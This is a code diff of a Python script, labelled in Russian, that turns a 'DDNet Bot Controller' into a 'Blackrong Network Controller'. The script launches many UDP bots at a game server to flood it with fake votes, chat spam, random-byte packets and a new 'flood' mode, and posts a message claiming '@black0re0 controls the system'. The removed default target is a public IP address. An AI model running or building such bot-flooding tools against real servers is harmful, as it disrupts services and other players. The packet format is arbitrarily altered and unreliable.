@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 import os
 import sys
 import json
@@ -9,29 +10,32 @@ from colorama import Fore, Style, init
 
 init(autoreset=True)
 
-CONFIG_FILE = "ddnet_config.json"
+CONFIG_FILE = "blackrong_config.json"
 BANNER = f"""
 {Fore.CYAN}
-╔═╗╔╦╗╔═╗╦  ╔═╗╦═╗╔═╗╔═╗╦  
-║╣ ║║║╠═╝║  ║╣ ╠╦╝╠═╣║  ║  
-╚═╝╩ ╩╩  ╩═╝╚═╝╩╚═╩ ╩╚═╝╩═╝
-{Fore.YELLOW}DDNet Bot Controller v5.2
+╔╗ ╔═╗╔═╗╦═╗╔═╗╔═╗╦═╗╔═╗╔═╗╔═╗
+╠╩╗╠═╣║ ╦╠╦╝╠═╣║ ╦╠╦╝╠═╣╠═╝╠═╣
+╚═╝╩ ╩╚═╝╩╚═╩ ╩╚═╝╩╚═╩ ╩╩  ╩ ╩
+{Fore.YELLOW}Blackrong Network Controller v6.6
+{Fore.MAGENTA}При поддержке @black0re0
 {Style.RESET_ALL}
 """
 
-class DDNetProtocol:
+class BlackrongProtocol:
     PACKET_TYPES = {
         'CONNECT': b'\x00',
-        'ACCEPT': b'\x02',
-        'VOTE': b'\x0a',
-        'CHAT': b'\x0d'
+        'ACCEPT': b'\x01',
+        'VOTE': b'\x03',
+        'CHAT': b'\x04',
+        'KEEPALIVE': b'\x0f'
     }
 
     @staticmethod
     def create_packet(packet_type, payload=b''):
-        return packet_type + payload
+        header = b'\x00\x00\x00\x00'  # 4-байтовый заголовок
+        return header + packet_type + payload
 
-class DDBot:
+class BlackrongBot:
     def __init__(self, server_ip, server_port, bot_id, mode):
         self.server = (server_ip, server_port)
         self.bot_id = bot_id
@@ -41,6 +45,8 @@ class DDBot:
         self.token = None
         self.client_id = random.randint(0, 0xFFFFFFFF)
         self.retries = 0
+        self.last_action = time.time()
+        self.sequence = 0
 
     def connect(self):
         while self.running and self.retries < 15:
@@ -49,7 +55,7 @@ class DDBot:
                 self._main_loop()
                 return
             except Exception as e:
-                print(f"{Fore.RED}Bot {self.bot_id} error: {str(e)}")
+                print(f"{Fore.RED}Бот {self.bot_id} ошибка: {str(e)}")
                 self.retries += 1
                 time.sleep(min(30, 2 ** self.retries))
             finally:
@@ -60,129 +66,170 @@ class DDBot:
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         self.sock.settimeout(10)
 
-        # Step 1: Initial handshake
-        self.sock.sendto(
-            DDNetProtocol.create_packet(DDNetProtocol.PACKET_TYPES['CONNECT']),
-            self.server
-        )
+        # Шаг 1: Первоначальное рукопожатие
+        connect_packet = BlackrongProtocol.create_packet(BlackrongProtocol.PACKET_TYPES['CONNECT'])
+        print(f"{Fore.MAGENTA}[Бот {self.bot_id}] Отправка CONNECT: {connect_packet.hex()}")
+        self.sock.sendto(connect_packet, self.server)
 
-        # Step 2: Receive server response
-        response = self.sock.recv(1024)
-        if len(response) < 12:
-            raise ConnectionError("Invalid handshake response")
+        try:
+            # Шаг 2: Получение ответа сервера
+            response = self.sock.recv(1024)
+            print(f"{Fore.CYAN}[Бот {self.bot_id}] Получено: {response.hex()} (длина: {len(response)})")
+            
+            if len(response) < 12:
+                raise ConnectionError("Неверный ответ сервера")
 
-        self.token = response[4:8]
-        server_time = response[8:12]
+            self.token = response[4:8]
+            server_time = response[8:12]
 
-        # Step 3: Send client info
-        ack_packet = DDNetProtocol.create_packet(
-            DDNetProtocol.PACKET_TYPES['ACCEPT'],
-            self.token + server_time + self.client_id.to_bytes(4, 'little')
-        )
-        self.sock.sendto(ack_packet, self.server)
+            # Шаг 3: Отправка клиентской информации
+            ack_packet = BlackrongProtocol.create_packet(
+                BlackrongProtocol.PACKET_TYPES['ACCEPT'],
+                self.token + server_time + self.client_id.to_bytes(4, 'big')
+            )
+            print(f"{Fore.MAGENTA}[Бот {self.bot_id}] Отправка ACCEPT: {ack_packet.hex()}")
+            self.sock.sendto(ack_packet, self.server)
 
-        # Step 4: Final confirmation
-        final_response = self.sock.recv(1024)
-        if final_response[0] != 0x02:
-            raise ConnectionError("Connection rejected")
+            # Шаг 4: Финальное подтверждение
+            final_response = self.sock.recv(1024)
+            print(f"{Fore.CYAN}[Бот {self.bot_id}] Финальный ответ: {final_response.hex()}")
+            
+            if final_response[0] != int.from_bytes(BlackrongProtocol.PACKET_TYPES['ACCEPT'], "big"):
+                raise ConnectionError("Соединение отклонено")
 
-        print(f"{Fore.GREEN}Bot {self.bot_id} connected successfully!")
+            print(f"{Fore.GREEN}Бот {self.bot_id} успешно подключен!")
+            self.retries = 0
+
+        except socket.timeout:
+            raise ConnectionError("Таймаут соединения")
 
     def _main_loop(self):
         while self.running:
             try:
-                if self.mode == 'vote':
-                    self._send_vote()
-                elif self.mode == 'message':
-                    self._send_message()
-                elif self.mode == 'spam':
-                    self._send_spam()
+                now = time.time()
                 
-                time.sleep(random.uniform(0.5, 2.0))
+                # Основные действия
+                if now - self.last_action > random.uniform(1.0, 3.0):
+                    if self.mode == 'vote':
+                        self._send_vote()
+                    elif self.mode == 'message':
+                        self._send_message()
+                    elif self.mode == 'spam':
+                        self._send_spam()
+                    elif self.mode == 'flood':
+                        self._send_flood()
+                    
+                    self.last_action = now
+                    self.sequence += 1
+
+                # Поддержание соединения
+                self._handle_keepalive()
+
             except Exception as e:
-                raise RuntimeError(f"Action failed: {str(e)}")
+                raise RuntimeError(f"Ошибка действия: {str(e)}")
+
+    def _handle_keepalive(self):
+        try:
+            self.sock.settimeout(5)
+            data = self.sock.recv(1024)
+            if data:
+                if data[0] == int.from_bytes(BlackrongProtocol.PACKET_TYPES['KEEPALIVE'], "big"):
+                    print(f"{Fore.BLUE}[Бот {self.bot_id}] Получен keepalive")
+                    self.sock.sendto(data, self.server)  # Ответ на keepalive
+        except socket.timeout:
+            pass
 
     def _send_vote(self):
-        packet = DDNetProtocol.create_packet(
-            DDNetProtocol.PACKET_TYPES['VOTE'],
-            self.token + b'\xF3'
+        vote_data = self.token + b'\x01\x00\x00\x00'  # Пример голосования
+        packet = BlackrongProtocol.create_packet(
+            BlackrongProtocol.PACKET_TYPES['VOTE'],
+            vote_data
         )
+        print(f"{Fore.YELLOW}[Бот {self.bot_id}] Отправка голоса: {packet.hex()}")
         self.sock.sendto(packet, self.server)
 
     def _send_message(self):
-        msg = f"Message from bot {self.bot_id}"
-        packet = DDNetProtocol.create_packet(
-            DDNetProtocol.PACKET_TYPES['CHAT'],
-            msg.encode().ljust(64, b'\x00')
+        msg = f"[BOT{self.bot_id}] @black0re0 контролирует систему"
+        encoded_msg = msg.encode().ljust(128, b'\x00')
+        packet = BlackrongProtocol.create_packet(
+            BlackrongProtocol.PACKET_TYPES['CHAT'],
+            self.token + encoded_msg
         )
         self.sock.sendto(packet, self.server)
+        print(f"{Fore.YELLOW}[Бот {self.bot_id}] Сообщение отправлено")
 
     def _send_spam(self):
-        packet = DDNetProtocol.create_packet(
-            DDNetProtocol.PACKET_TYPES['CHAT'],
-            os.urandom(64)
+        spam_msg = os.urandom(64)
+        packet = BlackrongProtocol.create_packet(
+            BlackrongProtocol.PACKET_TYPES['CHAT'],
+            self.token + spam_msg
         )
         self.sock.sendto(packet, self.server)
+        print(f"{Fore.YELLOW}[Бот {self.bot_id}] Спам пакет отправлен")
+
+    def _send_flood(self):
+        for _ in range(5):
+            self._send_spam()
+            time.sleep(0.1)
 
     def stop(self):
         self.running = False
 
 def load_config():
     default_config = {
-        'server_ip': '46.174.48.103',
-        'server_port': 53070,
+        'server_ip': '127.0.0.1',
+        'server_port': 8303,
         'mode': 'message',
-        'bot_count': 20
+        'bot_count': 10,
+        'max_retries': 15,
+        'cooldown': 1.5
     }
     
     if os.path.exists(CONFIG_FILE):
         try:
             with open(CONFIG_FILE) as f:
-                user_config = json.load(f)
-                # Объединяем с дефолтными значениям
-                return {**default_config, **user_config}
-        except json.JSONDecodeError:
-            print(f"{Fore.RED}Ошибка в конфиге! Использую настройки по умолчанию")
+                return {**default_config, **json.load(f)}
+        except:
+            print(f"{Fore.RED}Ошибка конфига! Используются настройки по умолчанию")
             return default_config
     return default_config
 
 def save_config(config):
     with open(CONFIG_FILE, 'w') as f:
-        json.dump(config, f, indent=4)
+        json.dump(config, f, indent=4, ensure_ascii=False)
 
 def main():
     print(BANNER)
     config = load_config()
     
-    # Если конфига не существует - сохраняем дефолтный
     if not os.path.exists(CONFIG_FILE):
         save_config(config)
         print(f"{Fore.YELLOW}Создан новый конфиг: {CONFIG_FILE}")
 
     bots = []
     try:
-        print(f"{Fore.CYAN}Запускаю {config['bot_count']} ботов в режиме '{config['mode']}'...")
+        print(f"{Fore.CYAN}Запуск {config['bot_count']} ботов в режиме '{config['mode']}'...")
         for i in range(config['bot_count']):
-            bot = DDBot(
+            bot = BlackrongBot(
                 config['server_ip'],
                 config['server_port'],
                 i+1,
                 config['mode']
             )
-            thread = threading.Thread(target=bot.connect)
+            thread = threading.Thread(target=bot.connect, daemon=True)
             bots.append((bot, thread))
             thread.start()
-            time.sleep(0.1)
+            time.sleep(config['cooldown'])
 
         input("\nНажмите Enter для остановки...")
     except KeyboardInterrupt:
-        print(f"\n{Fore.RED}Прервано пользователем!")
+        print(f"\n{Fore.RED}Прервано!")
     finally:
-        print(f"\n{Fore.RED}Останавливаю ботов...")
+        print(f"\n{Fore.RED}Остановка ботов...")
         for bot, thread in bots:
             bot.stop()
             thread.join()
-        print(f"{Fore.GREEN}Все процессы завершены!")
+        print(f"{Fore.GREEN}Все операции завершены!")
 
 if __name__ == "__main__":
     main()
